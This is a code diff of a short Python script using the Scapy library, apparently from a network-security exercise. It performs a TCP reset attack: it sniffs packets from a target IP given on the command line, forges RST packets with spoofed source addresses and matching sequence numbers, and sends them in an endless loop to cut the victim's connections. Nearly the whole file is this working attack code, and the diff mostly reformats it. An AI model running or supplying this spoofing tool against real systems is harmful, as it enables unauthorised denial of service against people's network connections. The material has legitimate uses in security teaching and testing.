@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-#running command: python Sniffer.py victimIP
+#running command: python RST.py victimIP
 
 import sys  #for command line argument
 import time
@@ -13,14 +13,26 @@ victim_ip = sys.argv[1]
 
 
 def sendRST(pkt):
+
+    IPLayer = IP(dst=victim_ip, 
+        src=pkt[IP].dst)
+    
+    TCPLayer = TCP(flags="R", 
+        seq=pkt[TCP].ack, 
+        dport=pkt[TCP].sport, 
+        sport=pkt[TCP].dport)
+    
+    spoofpkt = IPLayer/TCPLayer
+
+    send(spoofpkt, verbose=2)
+
+
     # print(pkt.summary())
 
     # print("IP source = " + str(pkt[IP].src))
     # print("Port source = " + str(pkt[TCP].sport))
-
     # print("IP dest = " + str(pkt[IP].dst))
     # print("Port dest = " + str(pkt[TCP].dport))
-
     # print("IP len = " + str(pkt[IP].len))
     # print("SEQ = " + str(pkt[TCP].seq))
     # print("ACK = " + str(pkt[TCP].ack))
@@ -28,23 +40,18 @@ def sendRST(pkt):
 
     # print()
 
-    IPLayer = IP(dst=victim_ip, src=pkt[IP].dst)
-    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
-    spoofpkt = IPLayer/TCPLayer
-
+    # print(spoofpkt.summary())
 
     # print("Spoofed IP source = " + str(spoofpkt[IP].src))
     # print("Spoofed Port source = " + str(spoofpkt[TCP].sport))
-
     # print("Spoofed IP dest = " + str(spoofpkt[IP].dst))
     # print("Spoofed Port dest = " + str(spoofpkt[TCP].dport))
-
     # print("Spoofed IP len = " + str(spoofpkt[IP].len))
     # print("Spoofed SEQ = " + str(spoofpkt[TCP].seq))
     # print("Spoofed ACK = " + str(spoofpkt[TCP].ack))
     # print("Spoofed Window = " + str(spoofpkt[TCP].window))
 
-    send(spoofpkt, verbose=2)
+    
 
     # print()    
     # print()
@@ -53,5 +60,8 @@ def sendRST(pkt):
 
 
 while 1:
-    pkt = sniff(filter="tcp and src host " + victim_ip, prn=sendRST, store=0, count=1)
+    pkt = sniff(filter="tcp and src host " + victim_ip, 
+        prn=sendRST, 
+        store=0, 
+        count=1)
     
